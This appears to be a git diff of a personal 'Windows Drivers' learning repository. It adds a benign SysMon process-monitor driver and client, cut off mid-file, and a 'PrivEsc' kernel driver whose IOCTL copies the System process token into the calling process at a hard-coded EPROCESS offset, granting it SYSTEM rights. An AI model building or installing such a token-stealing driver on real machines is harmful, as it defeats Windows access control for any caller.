++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <PropertyGroup />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++    <ClCompile>
++      <RuntimeLibrary>
++      </RuntimeLibrary>
++    </ClCompile>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <FilesToPackage Include="$(TargetPath)" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Source.cpp" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="PrivEscCommon.h" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/PrivEsc/PrivEsc/PrivEsc.vcxproj.filters b/PrivEsc/PrivEsc/PrivEsc.vcxproj.filters
+new file mode 100644
+index 0000000..c2b3ccb
+--- /dev/null
++++ b/PrivEsc/PrivEsc/PrivEsc.vcxproj.filters
+@@ -0,0 +1,31 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++    <Filter Include="Driver Files">
++      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
++      <Extensions>inf;inv;inx;mof;mc;</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Source.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="PrivEscCommon.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/PrivEsc/PrivEsc/PrivEscCommon.h b/PrivEsc/PrivEsc/PrivEscCommon.h
+new file mode 100644
+index 0000000..19fefe1
+--- /dev/null
++++ b/PrivEsc/PrivEsc/PrivEscCommon.h
+@@ -0,0 +1,3 @@
++#pragma once
++
++#define IOCTL_PRIVESC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+diff --git a/PrivEsc/PrivEsc/Source.cpp b/PrivEsc/PrivEsc/Source.cpp
+new file mode 100644
+index 0000000..7743ce7
+--- /dev/null
++++ b/PrivEsc/PrivEsc/Source.cpp
+@@ -0,0 +1,145 @@
++#include <ntifs.h>
++#include <ntdef.h>
++#include <ntddk.h>
++#include "PrivEscCommon.h"
++
++#define EX_FAST_REF_MASK 0xFFFFFFFFFFFFFFF0  //Mask to clear the lowest 4 bits (reference count)
++
++typedef struct _DEVICE_EXTENSION {
++    PEPROCESS SystemProcess;  // Pointer to the system process object
++} DEVICE_EXTENSION, * PDEVICE_EXTENSION;
++
++void PrivEscUnload(PDRIVER_OBJECT DriverObject);
++NTSTATUS PrivEscCreate(PDEVICE_OBJECT, PIRP Irp);
++NTSTATUS PrivEscClose(PDEVICE_OBJECT, PIRP Irp);
++NTSTATUS PrivEscIOControl(PDEVICE_OBJECT, PIRP Irp);
++
++extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
++
++    DriverObject->DriverUnload = PrivEscUnload;
++    DriverObject->MajorFunction[IRP_MJ_CREATE] = PrivEscCreate;
++    DriverObject->MajorFunction[IRP_MJ_CLOSE] = PrivEscClose;
++    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PrivEscIOControl;
++
++    PDEVICE_OBJECT DeviceObject;
++    UNICODE_STRING DevName = RTL_CONSTANT_STRING(L"\\Device\\PrivEsc");
++    NTSTATUS status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &DevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
++
++    if (!NT_SUCCESS(status)) {
++        KdPrint(("Failed in IoCreateDevice (0x%X)\n", status));
++        return status;
++    }
++
++    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\PrivEsc");
++    status = IoCreateSymbolicLink(&symLink, &DevName);
++
++    if (!NT_SUCCESS(status)) {
++        IoDeleteDevice(DeviceObject);
++        KdPrint(("Failed in IoCreateSymbolicLink (0x%X)\n", status));
++        return status;
++    }
++
++    return STATUS_SUCCESS;
++}
++
++void PrivEscUnload(PDRIVER_OBJECT DriverObject) {
++
++    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\PrivEsc");
++    IoDeleteSymbolicLink(&symLink);
++
++    IoDeleteDevice(DriverObject->DeviceObject);
++}
++
++NTSTATUS PrivEscCreate(PDEVICE_OBJECT, PIRP Irp) {
++    Irp->IoStatus.Status = STATUS_SUCCESS;
++    Irp->IoStatus.Information = 0;
++    IoCompleteRequest(Irp, IO_NO_INCREMENT);
++    return STATUS_SUCCESS;
++}
++
++NTSTATUS PrivEscClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++    // Retrieve the current process from the IRP or device object
++    //PEPROCESS CurrentProcess = IoGetCurrentProcess();
++
++    // Dereference the token in IRP_MJ_CLOSE, but I need to exclude the refCnt using the mask
++    //PACCESS_TOKEN currentToken = (PACCESS_TOKEN)((*((char*)CurrentProcess + 0x358)) & EX_FAST_REF_MASK);
++
++    
++
++    // Get the system process from device extension
++    PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
++    PEPROCESS SystemProcess = DeviceExtension->SystemProcess;
++
++    // Ensure that the system process is valid before dereferencing
++    if (SystemProcess != NULL) {
++        ObDereferenceObject(SystemProcess);
++    }
++
++    // Complete the IRP
++    Irp->IoStatus.Status = STATUS_SUCCESS;
++    Irp->IoStatus.Information = 0;
++    IoCompleteRequest(Irp, IO_NO_INCREMENT);
++    return STATUS_SUCCESS;
++}
++
++NTSTATUS PrivEscIOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
++    auto dic = &stack->Parameters.DeviceIoControl;
++    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
++
++    switch (dic->IoControlCode) {
++    case IOCTL_PRIVESC: {
++        PEPROCESS CurrentProcess = IoGetCurrentProcess();
++        PEPROCESS SystemProcess = NULL;
++        PACCESS_TOKEN SystemToken = NULL;
++        PACCESS_TOKEN CurrentToken = NULL;
++
++        // Attempt to get the system process by ID (ID for System Process is 4)
++        status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
++        if (!NT_SUCCESS(status)) {
++            DbgPrint("Failed to find System process (0x%08X)\n", status);
++            break;
++        }
++
++        // Save the system process for later dereferencing in close
++        PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
++        DeviceExtension->SystemProcess = SystemProcess;
++
++        // Reference system token
++        SystemToken = PsReferencePrimaryToken(SystemProcess);
++        if (SystemToken == NULL) {
++            DbgPrint("Failed to get the primary token for the System process\n");
++            ObDereferenceObject(SystemProcess);
++            status = STATUS_UNSUCCESSFUL;
++            break;
++        }
++
++        // Reference current process token
++        CurrentToken = PsReferencePrimaryToken(CurrentProcess);
++        if (CurrentToken == NULL) {
++            DbgPrint("Failed to get the primary token for the current process\n");
++            PsDereferencePrimaryToken(SystemToken);
++            ObDereferenceObject(SystemProcess);
++            status = STATUS_UNSUCCESSFUL;
++            break;
++        }
++
++        // Replace current process's token with the system token
++        *(PACCESS_TOKEN*)((char*)CurrentProcess + 0x358) = SystemToken;
++
++        // Tokens are referenced throughout the function, so no immediate dereferencing
++        DbgPrint("Successfully replaced the current process's token with the system token\n");
++
++        status = STATUS_SUCCESS;
++        break;
++    }
++    default:
++        status = STATUS_INVALID_DEVICE_REQUEST;
++        break;
++    }
++
++    Irp->IoStatus.Status = status;
++    Irp->IoStatus.Information = 0;
++    IoCompleteRequest(Irp, IO_NO_INCREMENT);
++    return status;
++}
+diff --git a/README.md b/README.md
+new file mode 100644
+index 0000000..c954970
+--- /dev/null
++++ b/README.md
+@@ -0,0 +1 @@
++# Windows Drivers
+diff --git a/SysMon/ClientSysMon/ClientSysMon.c b/SysMon/ClientSysMon/ClientSysMon.c
+new file mode 100644
+index 0000000..913b097
+--- /dev/null
++++ b/SysMon/ClientSysMon/ClientSysMon.c
+@@ -0,0 +1,82 @@
++#include <windows.h>
++#include <stdio.h>
++#include "..\SysMon\SysMonPublic.h"
++
++int Error(const char* message) {
++    fprintf(stderr, "%s\n", message);
++    return 1;
++}
++
++void DisplayInfo(BYTE* buffer, DWORD size);
++void DisplayTime(const LARGE_INTEGER* time);
++int main() {
++    HANDLE hFile = CreateFile(L"\\\\.\\SysMon", GENERIC_READ, 0,
++        NULL, OPEN_EXISTING, 0, NULL);
++    if (hFile == INVALID_HANDLE_VALUE)
++        return Error("Failed to open file");
++
++    const int size = 1 << 16; // 64 KB
++    BYTE* buffer = (BYTE*)malloc(size);
++    if (buffer == NULL) {
++        CloseHandle(hFile);
++        return Error("Failed to allocate memory");
++    }
++
++    while (1) {
++        DWORD bytes = 0;
++        if (ReadFile(hFile, buffer, size, &bytes, NULL)) {
++            if (bytes > 0)
++                DisplayInfo(buffer, bytes);
++        }
++        else {
++            fprintf(stderr, "ReadFile failed with error: %lu\n", GetLastError());
++            break;
++        }
++
++        Sleep(400); // wait a bit before polling again
++    }
++
++    free(buffer);
++    CloseHandle(hFile);
++    return 0;
++}
++
++void DisplayInfo(BYTE* buffer, DWORD size) {
++    while (size > 0) {
++        FullItem* item = (FullItem*)buffer;
++
++        DisplayTime(&item->header.Time);
++
++        switch (item->header.Type) {
++        case ITEM_PROCESS_EXIT:
++            printf("Process %u Exited (Code: %u)\n",
++                item->data.processExitInfo.ProcessId,
++                item->data.processExitInfo.ExitCode);
++            break;
++
++        case ITEM_PROCESS_CREATE:
++            printf("Process %u Created. Command line: %.*ws\n",
++                item->data.processCreateInfo.ProcessId,
++                (int)(item->data.processCreateInfo.CommandLineLength),
++                item->data.processCreateInfo.CommandLine);
++            break;
++
++        default:
++            fprintf(stderr, "Unknown item type: %d\n", item->header.Type);
++            break;
++        }
++
++        buffer = buffer + item->header.Size + sizeof(ItemHeader);
++        size = size - item->header.Size - sizeof(ItemHeader);
++    }
++}
++
++void DisplayTime(const LARGE_INTEGER* time) {
++    FILETIME local;
++    // Convert to local time first (KeQuerySystemTimePrecise returns UTC)
++    FileTimeToLocalFileTime((FILETIME*)time, &local);
++    SYSTEMTIME st;
++    FileTimeToSystemTime(&local, &st);
++    printf("%02d:%02d:%02d.%03d: ",
++        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
++}
+diff --git a/SysMon/ClientSysMon/ClientSysMon.vcxproj b/SysMon/ClientSysMon/ClientSysMon.vcxproj
+new file mode 100644
+index 0000000..34153e5
+--- /dev/null
++++ b/SysMon/ClientSysMon/ClientSysMon.vcxproj
+@@ -0,0 +1,136 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{228cbe3a-27b1-4bd1-8e4a-f47e4a174d41}</ProjectGuid>
++    <RootNamespace>ClientSysMon</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientSysMon.c" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/SysMon/ClientSysMon/ClientSysMon.vcxproj.filters b/SysMon/ClientSysMon/ClientSysMon.vcxproj.filters
+new file mode 100644
+index 0000000..d01128c
+--- /dev/null
++++ b/SysMon/ClientSysMon/ClientSysMon.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientSysMon.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/SysMon/SysMon.sln b/SysMon/SysMon.sln
+new file mode 100644
+index 0000000..6fd0bdd
+--- /dev/null
++++ b/SysMon/SysMon.sln
+@@ -0,0 +1,42 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SysMon", "SysMon\SysMon.vcxproj", "{52687C01-2500-4DD3-AE04-CDA7509C9FC1}"
++EndProject
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ClientSysMon", "ClientSysMon\ClientSysMon.vcxproj", "{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|ARM64 = Debug|ARM64
++		Debug|x64 = Debug|x64
++		Release|ARM64 = Release|ARM64
++		Release|x64 = Release|x64
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|ARM64.ActiveCfg = Debug|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|ARM64.Build.0 = Debug|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|ARM64.Deploy.0 = Debug|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|x64.ActiveCfg = Debug|x64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|x64.Build.0 = Debug|x64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Debug|x64.Deploy.0 = Debug|x64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|ARM64.ActiveCfg = Release|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|ARM64.Build.0 = Release|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|ARM64.Deploy.0 = Release|ARM64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|x64.ActiveCfg = Release|x64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|x64.Build.0 = Release|x64
++		{52687C01-2500-4DD3-AE04-CDA7509C9FC1}.Release|x64.Deploy.0 = Release|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Debug|ARM64.ActiveCfg = Debug|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Debug|ARM64.Build.0 = Debug|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Debug|x64.ActiveCfg = Debug|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Debug|x64.Build.0 = Debug|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Release|ARM64.ActiveCfg = Release|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Release|ARM64.Build.0 = Release|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Release|x64.ActiveCfg = Release|x64
++		{228CBE3A-27B1-4BD1-8E4A-F47E4A174D41}.Release|x64.Build.0 = Release|x64
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/SysMon/SysMon/Globals.c b/SysMon/SysMon/Globals.c
+new file mode 100644
+index 0000000..b3e0773
+--- /dev/null
++++ b/SysMon/SysMon/Globals.c
+@@ -0,0 +1,79 @@
++#include <ntddk.h>
++#include "..\SysMon\Globals.h"
++#include "..\SysMon\SysMonPublic.h"
++
++void Globals_Init(PGlobals globals, ULONG maxItems) {
++	InitializeListHead(&globals->m_ItemsHead);
++	ExInitializeFastMutex(&globals->m_Lock);
++	globals->m_Count = 0; 
++	globals->m_MaxCount = maxItems; 
++}
++BOOLEAN Globals_AddItem(PGlobals globals, LIST_ENTRY* entry) {
++    ExAcquireFastMutex(&globals->m_Lock);
++
++    // Check if the list has reached its maximum size
++    if (globals->m_Count == globals->m_MaxCount) {
++        PLIST_ENTRY head = RemoveHeadList(&globals->m_ItemsHead);
++        if (head != &globals->m_ItemsHead) {  // Ensure the list is not empty
++            // Retrieve the item from the list entry
++            PFullItem item = CONTAINING_RECORD(head, FullItem, Entry);
++
++            // Free the item safely
++            ExFreePool(item);
++            globals->m_Count--;  // Decrement the count
++        }
++    }
++
++    // Before inserting, ensure the item is not already in the list
++    PLIST_ENTRY current = globals->m_ItemsHead.Flink;
++    while (current != &globals->m_ItemsHead) {
++        PFullItem item = CONTAINING_RECORD(current, FullItem, Entry);
++        if (item == (PFullItem)entry) {  // Prevent double insertion
++            ExReleaseFastMutex(&globals->m_Lock);
++            return FALSE;  // Item already in the list
++        }
++        current = current->Flink;
++    }
++
++    // Insert the new item into the list
++    InsertTailList(&globals->m_ItemsHead, entry);
++    globals->m_Count++;  // Increment the count
++
++    ExReleaseFastMutex(&globals->m_Lock);
++    return TRUE;  // Success
++}
++
++LIST_ENTRY* Globals_RemoveItem(PGlobals globals) {
++    ExAcquireFastMutex(&globals->m_Lock);
++    PLIST_ENTRY item = RemoveHeadList(&globals->m_ItemsHead);
++    if (item == &globals->m_ItemsHead) { // If the list is empty
++        ExReleaseFastMutex(&globals->m_Lock);
++        return NULL;  // No items to remove
++    }
++
++    globals->m_Count--;  // Decrement the count
++
++    ExReleaseFastMutex(&globals->m_Lock);
++    return item;  // Return the item
++}
++
++void Globals_AddHeadItem(PGlobals globals, LIST_ENTRY* entry) {
++    ExAcquireFastMutex(&globals->m_Lock);
++
++    // Check if the item is already in the list
++    PLIST_ENTRY current = globals->m_ItemsHead.Flink;
++    while (current != &globals->m_ItemsHead) {
++        PFullItem item = CONTAINING_RECORD(current, FullItem, Entry);
++        if (item == (PFullItem)entry) {  // Prevent double insertion
++            ExReleaseFastMutex(&globals->m_Lock);
++            return;
++        }
++        current = current->Flink;
++    }
++
++    // Insert the item at the head of the list
++    InsertHeadList(&globals->m_ItemsHead, entry);
++    globals->m_Count++;  // Increment the count
++
++    ExReleaseFastMutex(&globals->m_Lock);
++}
+diff --git a/SysMon/SysMon/Globals.h b/SysMon/SysMon/Globals.h
+new file mode 100644
+index 0000000..ce2ad07
+--- /dev/null
++++ b/SysMon/SysMon/Globals.h
+@@ -0,0 +1,13 @@
++#pragma once
++
++typedef struct {
++	LIST_ENTRY m_ItemsHead;
++	ULONG m_Count;
++	ULONG m_MaxCount;
++	FAST_MUTEX m_Lock;
++}Globals, *PGlobals;
++
++void Globals_Init(PGlobals globals, ULONG maxItems);
++BOOLEAN Globals_AddItem(PGlobals globals, LIST_ENTRY* entry);
++void Globals_AddHeadItem(PGlobals state, LIST_ENTRY* entry);
++LIST_ENTRY* Globals_RemoveItem(PGlobals globals);
+diff --git a/SysMon/SysMon/SysMon.c b/SysMon/SysMon/SysMon.c
+new file mode 100644
+index 0000000..ebfbc73
+--- /dev/null
++++ b/SysMon/SysMon/SysMon.c
+@@ -0,0 +1,196 @@
++#include <ntddk.h>
++#include "..\SysMon\SysMonPublic.h"
++#include "..\SysMon\Globals.h"
++
++Globals g_state; 
++
++void SysMonUnload(PDRIVER_OBJECT DriverObject);
++NTSTATUS SysMonCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
++NTSTATUS SysMonRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);
++
++void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
++
++NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
++	
